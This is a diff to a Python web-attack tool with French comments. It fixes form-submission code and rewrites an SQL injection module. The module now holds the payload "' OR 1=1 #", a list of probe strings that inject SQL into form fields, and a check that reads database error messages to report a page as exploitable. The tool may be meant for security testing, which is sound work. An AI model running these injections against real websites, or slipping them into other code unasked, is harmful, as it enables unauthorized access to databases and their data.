@@ -33,7 +33,7 @@ class FormAttack():
                 id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(selected_forms) - 1) + ') ? ')
         # If no form is found, stop the attack.
         elif len(selected_forms) == 0:
-            print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
+            print "Aucun formulaire contenant un champ '" + self.fieldname + "'. Abandon."
             return None
         # If only one form, selecting this one
         else: id = 0
@@ -105,7 +105,7 @@ class FormAttack():
         formdata = urllib.urlencode(self.fillForm(form, fieldvalue))
 
         # Detecting where to send the form
-        if (not 'action' in form) or form['action'] == '': form_dest = self.page
+        if (not 'action' in form) or form['action'] in ['', '#']: form_dest = self.page
         else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))
 
         # Sending the form in a POST or a GET request
@@ -133,20 +133,30 @@ class XSS(FormAttack):
             return False
 
 class SQLInjection(FormAttack):
-    PAYLOAD = "' OR 1==1 --"
+    PAYLOAD = "' OR 1=1 #"
+    TEST = ['\' OR SQL_INJECTION_WORK ; #', '" OR SQL_INJECTION_WORK ; #', ' OR SQL_INJECTION_WORK ; #']
+
+    ###
+    ### How to verify that a SQL injection works ??
+    ###
+    def success(self, result):
+        return ('Unknown column' in result and 'SQL_INJECTION_WORK' in result)
 
     def run(self, fieldname, fieldvalue = {}):
 
-        # Calling FormAttack run method
-        out = FormAttack.run(self, fieldname, fieldvalue)
-        if out == -1: return False    # If attack is aborted for any reason, it will return -1
+        for injection in SQLInjection.TEST:
+            SQLInjection.PAYLOAD = injection
 
-        ###
-        ### How to verify that a SQL injection works ??
-        ###
-        # if ??????????????:
-        #     print "Injection SQL exploitable sur " + os.path.join(self.target.host, self.page)
-        #     return True
-        # else:
-        #     print "Injection SQL non exploitable sur " + os.path.join(self.target.host, self.page)
-        #     return False
+            # Calling FormAttack run method
+            out = FormAttack.run(self, fieldname, fieldvalue)
+            if out == -1: continue    # If attack is aborted for any reason, it will return -1
+            elif self.success(out['data']):
+                print "Injection SQL exploitable sur " + os.path.join(self.target.host, self.page)
+                return True
+
+
+        if out != -1:
+            print "Injection SQL non exploitable sur " + os.path.join(self.target.host, self.page)
+            return False
+
+        return False
